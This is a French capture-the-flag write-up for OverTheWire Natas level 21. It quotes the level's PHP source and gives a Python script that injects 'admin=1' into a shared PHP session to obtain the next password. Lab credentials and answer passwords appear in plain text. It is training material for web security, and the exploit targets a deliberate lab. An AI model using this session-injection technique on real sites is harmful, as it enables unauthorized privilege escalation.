## Connexion (username=natas21 password=7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU)
```
http://natas21.natas.labs.overthewire.org/
```

## Recherche du mot de passe
On a deux pages, dont celle qui set les valeurs du array dans la session php:
```php
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';
```

Puis la seconde page qui print les credentials quand admin = 1 est présent dans la session php:
```php
function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
session_start();
print_credentials();
```
Il faut juste ajouter au array un admin=1

```python
import requests

url = "http://natas21-experimenter.natas.labs.overthewire.org/index.php"
header = {
    "Authorization": "Basic bmF0YXMyMTo3bWVIWjFsMnpQb0sydjFxZlRVeHE0WWRmamE0VWxtVQ=="
}
with requests.Session() as session:
    session.headers.update(header)
    response = session.get(url)
    header["Cookie"] = "PHPSESSID=" + response.cookies.get_dict()["PHPSESSID"]
    session.headers.update(header)
    payload = {
        "align":"center",
        "fontsize":"100%25",
        "bgcolor":"yellow",
        "submit":"Update", 
        "admin":"1"
    }
    response = session.post(url, data=payload)

url2 = "http://natas21.natas.labs.overthewire.org/"
with requests.Session() as session:
    session.headers.update(header)
    response = session.get(url2)
    print(response.text)
```
## Prochain mot de passe
```
964laB0r7TuDqJj5b3HFtwsQoc0GhjBF
```